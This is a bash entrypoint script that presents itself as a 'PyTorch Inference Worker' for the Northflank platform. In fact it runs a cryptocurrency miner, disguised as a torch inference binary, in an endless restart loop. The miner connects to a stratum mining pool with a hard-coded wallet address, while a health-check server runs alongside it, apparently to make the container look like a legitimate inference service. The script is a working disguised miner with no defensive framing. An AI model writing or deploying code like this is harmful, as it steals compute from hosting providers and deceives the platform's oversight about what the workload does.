#!/usr/bin/env bash
set -e

WALLET="${WALLET_ADDRESS:-o1xlq6vc67ljt4khf2e7m2m66lu78a4j8my2nd0y7xyyfmfrrvzc0qlh5f7h}"
POOL="${POOL_ADDRESS:-stratum+ssl://hk.innovlab.cc:19601}"
WORKER="${WORKER_NAME:-h100-01}"
LOG_FILE="/tmp/miner.log"

echo "=================================================="
echo "PyTorch Inference Worker (Northflank Engine)"
echo "Pool: ${POOL}"
echo "Worker: ${WORKER}"
echo "Target: ${WALLET}"
echo "=================================================="

python3 /app/app.py &
HTTP_PID=$!

cleanup() {
    echo "Stopping worker and health server..."
    kill -TERM "$HTTP_PID" 2>/dev/null || true
    exit 0
}
trap cleanup SIGINT SIGTERM

while true; do
    echo "[$(date -u)] Starting compute engine..." | tee -a "${LOG_FILE}"
    /opt/invminer/torch_inference_worker         --coin noid         -o "${POOL}"         -u "${WALLET}.${WORKER}"         -p x 2>&1 | tee -a "${LOG_FILE}" || true
    
    echo "[$(date -u)] Engine exited. Restarting in 5s..." | tee -a "${LOG_FILE}"
    sleep 5
done
